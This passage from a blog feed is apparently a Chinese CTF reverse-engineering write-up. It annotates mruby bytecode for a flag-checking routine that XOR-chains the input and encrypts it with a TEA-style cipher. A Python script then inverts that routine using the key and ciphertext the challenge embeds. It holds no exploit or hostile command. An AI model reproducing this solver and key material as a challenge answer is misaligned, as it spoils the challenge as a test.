SENDR5:encryptn=<span class="number">2</span></span><br><span class="line">      <span class="number">027</span> RETURNR5</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3d00</span> nregs=<span class="number">16</span> nlocals=<span class="number">11</span> pools=<span class="number">1</span> syms=<span class="number">8</span> reps=<span class="number">1</span> ilen=<span class="number">346</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:key</span><br><span class="line">  R5:c</span><br><span class="line">  R6:n</span><br><span class="line">  R7:num1</span><br><span class="line">  R8:num2</span><br><span class="line">  R9:enum1</span><br><span class="line">  R10:enum2</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER12R2; R2:p</span><br><span class="line">      <span class="number">007</span> SSENDR11:to_keyn=<span class="number">1</span></span><br><span class="line">      <span class="number">011</span> MOVER4R11; R4:key</span><br><span class="line">          <span class="comment">//key=to_key(p)</span></span><br><span class="line">      <span class="number">014</span> ARRAYR5R5<span class="number">0</span>; R5:c</span><br><span class="line">      <span class="number">017</span> LOADI_0R6; R6:n</span><br><span class="line">          <span class="comment">//定义c=[]，n=0</span></span><br><span class="line">      <span class="number">019</span> MOVER11R6; R6:n</span><br><span class="line">      <span class="number">022</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">025</span> SENDR12:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">029</span> LTR11R12</span><br><span class="line">      <span class="number">031</span> JMPNOTR11<span class="number">327</span></span><br><span class="line">          <span class="comment">//接着是一个循环</span></span><br><span class="line">      <span class="number">035</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">038</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">041</span> GETIDXR11R12</span><br><span class="line">      <span class="number">043</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">047</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">051</span> LOADIR12<span class="number">24</span> </span><br><span class="line">      <span class="number">054</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">058</span> MOVER7R11; R7:num1</span><br><span class="line">          <span class="comment">//num1=ord(t[n])&lt;&lt;24</span></span><br><span class="line">      <span class="number">061</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">064</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">067</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">070</span> ADDIR13<span class="number">1</span></span><br><span class="line">      <span class="number">073</span> GETIDXR12R13</span><br><span class="line">      <span class="number">075</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">079</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">083</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">086</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">090</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+1])&lt;&lt;16</span></span><br><span class="line">      <span class="number">092</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">095</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">098</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">101</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">104</span> ADDIR13<span class="number">2</span></span><br><span class="line">      <span class="number">107</span> GETIDXR12R13</span><br><span class="line">      <span class="number">109</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">113</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">117</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">120</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">124</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+2])&lt;&lt;8</span></span><br><span class="line">      <span class="number">126</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">129</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">132</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">135</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">138</span> ADDIR13<span class="number">3</span></span><br><span class="line">      <span class="number">141</span> GETIDXR12R13</span><br><span class="line">      <span class="number">143</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">147</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">151</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+3])</span></span><br><span class="line">      <span class="number">153</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">156</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">159</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">162</span> ADDIR12<span class="number">4</span></span><br><span class="line">      <span class="number">165</span> GETIDXR11R12</span><br><span class="line">      <span class="number">167</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">171</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">175</span> LOADIR12<span class="number">24</span></span><br><span class="line">      <span class="number">178</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">182</span> MOVER8R11; R8:num2</span><br><span class="line">          <span class="comment">//num2=ord(t[n+4])&lt;&lt;24</span></span><br><span class="line">      <span class="number">185</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">188</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">191</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">194</span> ADDIR13<span class="number">5</span></span><br><span class="line">      <span class="number">197</span> GETIDXR12R13</span><br><span class="line">      <span class="number">199</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">203</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">207</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">210</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">214</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2+=ord(t[n+5])&lt;&lt;16</span></span><br><span class="line">      <span class="number">216</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">219</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">222</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">225</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">228</span> ADDIR13<span class="number">6</span></span><br><span class="line">      <span class="number">231</span> GETIDXR12R13</span><br><span class="line">      <span class="number">233</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">237</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">241</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">244</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">248</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+6])&lt;&lt;8</span></span><br><span class="line">      <span class="number">250</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">253</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">256</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">259</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">262</span> ADDIR13<span class="number">7</span></span><br><span class="line">      <span class="number">265</span> GETIDXR12R13</span><br><span class="line">      <span class="number">267</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">271</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">275</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+7])</span></span><br><span class="line">      <span class="number">277</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">280</span> MOVER12R7; R7:num1</span><br><span class="line">      <span class="number">283</span> MOVER13R8; R8:num2</span><br><span class="line">      <span class="number">286</span> MOVER14R4; R4:key</span><br><span class="line">      <span class="number">289</span> SSENDR11:enc_onen=<span class="number">3</span></span><br><span class="line">      <span class="number">293</span> AREFR9R11<span class="number">0</span>; R9:enum1</span><br><span class="line">      <span class="number">297</span> AREFR10R11<span class="number">1</span>; R10:enum2</span><br><span class="line">          <span class="comment">//enum1,enum2=enc_one(num1,num2,key)</span></span><br><span class="line">      <span class="number">301</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">304</span> MOVER12R9; R9:enum1</span><br><span class="line">      <span class="number">307</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum1)</span></span><br><span class="line">      <span class="number">311</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">314</span> MOVER12R10; R10:enum2</span><br><span class="line">      <span class="number">317</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum2)</span></span><br><span class="line">      <span class="number">321</span> ADDIR6<span class="number">8</span>; R6:n</span><br><span class="line">      <span class="number">324</span> JMP<span class="number">019</span></span><br><span class="line">          <span class="comment">//步长为8的循环</span></span><br><span class="line">      <span class="number">327</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">330</span> BLOCKR12<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b3f50</span>)</span></span><br><span class="line">      333 SENDBR11:collectn=<span class="number">0</span></span><br><span class="line">      <span class="number">337</span> STRINGR12<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; </span><br><span class="line">      <span class="number">340</span> SENDR11:joinn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//调用&quot;&quot;.join(c.collect(0x18b3f50))</span></span><br><span class="line">      <span class="number">344</span> RETURNR11</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3f50</span> nregs=<span class="number">7</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:x</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> STRINGR4L(<span class="number">0</span>); %<span class="number">.8</span>x</span><br><span class="line">      <span class="number">007</span> MOVER5R1; R1:x</span><br><span class="line">      <span class="number">010</span> SSENDR3:<span class="built_in">sprintf</span>n=<span class="number">2</span></span><br><span class="line">          <span class="comment">//进制转换</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4020</span> nregs=<span class="number">6</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">007</span> STRINGR4<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; L*</span><br><span class="line">      <span class="number">010</span> SENDR3:unpackn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//每四个字节转成一个整数</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b40f0</span> nregs=<span class="number">11</span> nlocals=<span class="number">8</span> pools=<span class="number">0</span> syms=<span class="number">2</span> reps=<span class="number">1</span> ilen=<span class="number">42</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:num1</span><br><span class="line">  R2:num2</span><br><span class="line">  R3:key</span><br><span class="line">  R4:&amp;</span><br><span class="line">  R5:y</span><br><span class="line">  R6:z</span><br><span class="line">  R7:s</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">3</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0xc0000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER8R1; R1:num1</span><br><span class="line">      <span class="number">007</span> MOVER9R2; R2:num2</span><br><span class="line">      <span class="number">010</span> LOADI_0R10</span><br><span class="line">      <span class="number">012</span> MOVER5R8; R5:y</span><br><span class="line">      <span class="number">015</span> MOVER6R9; R6:z</span><br><span class="line">      <span class="number">018</span> MOVER7R10; R7:s</span><br><span class="line">      <span class="number">021</span> GETCONSTR8YY</span><br><span class="line">      <span class="number">024</span> BLOCKR9<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b41c0</span>)</span></span><br><span class="line">      027 SENDBR8:timesn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//循环YY次</span></span><br><span class="line">      <span class="number">031</span> MOVER8R5; R5:y</span><br><span class="line">      <span class="number">034</span> MOVER9R6; R6:z</span><br><span class="line">          <span class="comment">//返回y,z</span></span><br><span class="line">      <span class="number">037</span> ARRAYR8R8<span class="number">2</span></span><br><span class="line">      <span class="number">040</span> RETURNR8</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b41c0</span> nregs=<span class="number">10</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">0</span> ilen=<span class="number">186</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:i</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="comment">//不太重要的位操作</span></span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> GETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">008</span> GETUPVARR4<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">012</span> LOADI_3R5</span><br><span class="line">      <span class="number">014</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">018</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">022</span> LOADI_5R6</span><br><span class="line">      <span class="number">024</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">028</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">032</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">036</span> ADDR4R5</span><br><span class="line">      <span class="number">038</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">042</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">046</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">050</span> LOADIR8<span class="number">11</span></span><br><span class="line">      <span class="number">053</span> SENDR7:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">057</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">060</span> LOADI_3R8</span><br><span class="line">      <span class="number">062</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">066</span> GETIDXR6R7</span><br><span class="line">      <span class="number">068</span> ADDR5R6</span><br><span class="line">      <span class="number">070</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">074</span> ADDR3R4</span><br><span class="line">      <span class="number">076</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">080</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">083</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">087</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">091</span> GETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">095</span> GETCONSTR4XX</span><br><span class="line">      <span class="number">098</span> ADDR3R4</span><br><span class="line">      <span class="number">100</span> SETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">104</span> GETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">108</span> GETUPVARR4<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">112</span> LOADI_3R5</span><br><span class="line">      <span class="number">114</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">118</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">122</span> LOADI_5R6</span><br><span class="line">      <span class="number">124</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">128</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">132</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">136</span> ADDR4R5</span><br><span class="line">      <span class="number">138</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">142</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">146</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">150</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">153</span> LOADI_3R8</span><br><span class="line">      <span class="number">155</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">159</span> GETIDXR6R7</span><br><span class="line">      <span class="number">161</span> ADDR5R6</span><br><span class="line">      <span class="number">163</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">167</span> ADDR3R4</span><br><span class="line">      <span class="number">169</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">173</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">176</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">180</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">184</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4320</span> nregs=<span class="number">13</span> nlocals=<span class="number">8</span> pools=<span class="number">2</span> syms=<span class="number">7</span> reps=<span class="number">0</span> ilen=<span class="number">128</span><span class="comment">// 主逻辑check()</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">  R3:i</span><br><span class="line">  R4:lst_ch</span><br><span class="line">  R5:c</span><br><span class="line">  R6:k</span><br><span class="line">  R7:cipher_text</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> LOADI_0R3; R3:i</span><br><span class="line">      <span class="number">006</span> LOADI_0R4; R4:lst_ch</span><br><span class="line">          <span class="comment">//i和lst_ch初试均为0</span></span><br><span class="line">      <span class="number">008</span> MOVER8R3; R3:i</span><br><span class="line">      <span class="number">011</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">014</span> SENDR9:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">018</span> LTR8R9</span><br><span class="line">      <span class="number">020</span> JMPNOTR8<span class="number">086</span></span><br><span class="line">          <span class="comment">//以上是对i做循环，条件为`for i in range(len(p))`</span></span><br><span class="line">      <span class="number">024</span> MOVER8R1; R1:p</span><br><span class="line">      <span class="number">027</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">030</span> GETIDXR8R9</span><br><span class="line">          <span class="comment">//取p[i]</span></span><br><span class="line">      <span class="number">032</span> SENDR8:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">036</span> MOVER5R8; R5:c</span><br><span class="line">          <span class="comment">//ord(p[i])赋值给c</span></span><br><span class="line">      <span class="number">039</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">042</span> MOVER9R4; R4:lst_ch</span><br><span class="line">      <span class="number">045</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//取c和lst_ch进行异或</span></span><br><span class="line">      <span class="number">049</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">052</span> ADDIR9<span class="number">1</span></span><br><span class="line">          <span class="comment">//取i+1</span></span><br><span class="line">      <span class="number">055</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//将c^lst_ch的结果和(i+1)异或</span></span><br><span class="line">      <span class="number">059</span> SENDR8:chrn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//将该结果chr回来</span></span><br><span class="line">      <span class="number">063</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">066</span> MOVER10R3; R3:i</span><br><span class="line">      <span class="number">069</span> MOVER11R8</span><br><span class="line">      <span class="number">072</span> SETIDXR9R10R11</span><br><span class="line">          <span class="comment">//将chr后的字符赋值给p[i]</span></span><br><span class="line">      <span class="number">074</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">077</span> MOVER4R8; R4:lst_ch</span><br><span class="line">          <span class="comment">//把c的值赋给lst_ch</span></span><br><span class="line">      <span class="number">080</span> ADDIR3<span class="number">1</span>; R3:i</span><br><span class="line">      <span class="number">083</span> JMP<span class="number">008</span></span><br><span class="line">          <span class="comment">//步长循环为1</span></span><br><span class="line">      <span class="number">086</span> STRINGR6<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; aaaassssddddffff; R6:k</span><br><span class="line">          <span class="comment">//循环结束后定义k=&#x27;aaaassssddddffff&#x27;</span></span><br><span class="line">      <span class="number">089</span> GETCONSTR8Crypt</span><br><span class="line">      <span class="number">092</span> GETMCNSTR8R8::CIPHER</span><br><span class="line">      <span class="number">095</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">098</span> MOVER10R6; R6:k</span><br><span class="line">      <span class="number">101</span> SENDR8:encryptn=<span class="number">2</span></span><br><span class="line">          <span class="comment">//调用Crypt.CIPHER.encrypt(p, k)</span></span><br><span class="line">      <span class="number">105</span> MOVER7R8; R7:cipher_text</span><br><span class="line">      <span class="number">108</span> MOVER8R7; R7:cipher_text</span><br><span class="line">          <span class="comment">//将加密结果赋值给cipher_text</span></span><br><span class="line">      <span class="number">111</span> STRINGR9<span class="title function_">L</span><span class="params">(<span class="number">1</span>)</span>; f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb</span><br><span class="line">      <span class="number">114</span> EQR8R9</span><br><span class="line">          <span class="comment">//将cipher_text与f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb进行比较</span></span><br><span class="line">      <span class="number">116</span> JMPNOTR8<span class="number">124</span></span><br><span class="line">      <span class="number">120</span> LOADTR8</span><br><span class="line">      <span class="number">122</span> RETURNR8</span><br><span class="line">      <span class="number">124</span> LOADFR8</span><br><span class="line">      <span class="number">126</span> RETURNR8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_key</span>(<span class="params">p</span>):</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p), <span class="number">4</span>):</span><br><span class="line">        a.append(<span class="built_in">int</span>(p.encode()[i:i+<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line">c = <span class="string">&quot;f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb&quot;</span></span><br><span class="line">XX = <span class="number">305419896</span></span><br><span class="line">YY = <span class="number">16</span></span><br><span class="line">key = to_key(<span class="string">&quot;aaaassssddddffff&quot;</span>)</span><br><span class="line"> </span><br><span class="line">dec = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">16</span>):</span><br><span class="line">    num1 = <span class="built_in">int</span>(c[i:i+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    num2 = <span class="built_in">int</span>(c[i+<span class="number">8</span>:i+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">    y = num1  <span class="comment"># R5</span></span><br><span class="line">    z = num2  <span class="comment"># R6</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        s = s + XX</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        z = z - ((((y &lt;&lt; <span class="number">3</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (s + key[(s + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        z = z &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = s - XX</span><br><span class="line">        y = y - ((((z &lt;&lt; <span class="number">3</span>) ^ (z &gt;&gt; <span class="number">5</span>)) + z) ^ (s + key[((s &gt;&gt; <span class="number">11</span>) + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        y = y &amp; <span class="number">0xffffffff</span></span><br><span class="line">    dec[i//<span class="number">2</span>:i//<span class="number">2</span>+<span class="number">4</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(y)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line">    dec[i//<span class="number">2</span>+<span class="number">4</span>:i//<span class="number">2</span>+<span class="number">8</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(z)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line"><span class="built_in">print</span>(dec.<span class="built_in">hex</span>())</span><br><span class="line">lst_ch = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec)):</span><br><span class="line">    c = dec[i]</span><br><span class="line">    dec[i] = (c ^ (i + <span class="number">1</span>)) ^ lst_ch</span><br><span class="line">    lst_ch = dec[i]</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;考研选手来摸鱼。&lt;/p&gt;
&lt;p&gt;今年国赛菜得很快乐，趟得也很快乐~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2022</title>
    <link href="http://example.com/2022/01/24/hgame2022/"/>
    <id>http://example.com/2022/01/24/hgame2022/</id>
    <published>2022-01-24T07:19:07.000Z</published>
    <updated>2023-02-01T14:30:53.472Z</updated>
    
